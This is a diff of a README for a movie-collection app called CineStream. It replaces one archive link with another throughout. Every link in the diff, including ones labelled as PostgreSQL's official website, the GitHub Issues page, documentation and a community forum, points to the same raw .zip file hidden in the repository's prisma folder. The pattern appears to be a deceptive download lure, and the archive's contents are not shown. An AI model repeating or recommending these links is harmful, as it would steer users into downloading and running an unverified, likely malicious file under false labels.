@@ -8,7 +8,7 @@ CineStream is designed for movie lovers. This application lets you easily manage
 
 To get the latest version of CineStream, please visit this page to download the software:
 
-[![Download CineStream](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip%https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip)](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip)
+[![Download CineStream](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip%https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip)](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip)
 
 ### Steps to Download
 
@@ -37,7 +37,7 @@ Once you have downloaded the file, follow these installation steps:
 
 CineStream requires a database to store your movie and series information. You need to install PostgreSQL if you haven’t already.
 
-1. Download PostgreSQL from the [official website](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip).
+1. Download PostgreSQL from the [official website](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip).
 2. Run the installer and follow the instructions.
 3. During installation, note the username and password you create. You will need this later.
 
@@ -82,11 +82,11 @@ If you encounter any issues:
 
 ## 📞 Support
 
-If you need more help or experience issues, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip). You can report bugs or request features.
+If you need more help or experience issues, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip). You can report bugs or request features.
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip)
-- [Community Forum](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/migrations/20251103175914_init/cinestream-film-collection-backend_usitate.zip)
+- [Official Documentation](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/kaisersolos/cinestream-film-collection-backend/main/prisma/backend-cinestream-collection-film-2.7.zip)
 
 Feel free to explore, and enjoy managing your movie and series library with CineStream!
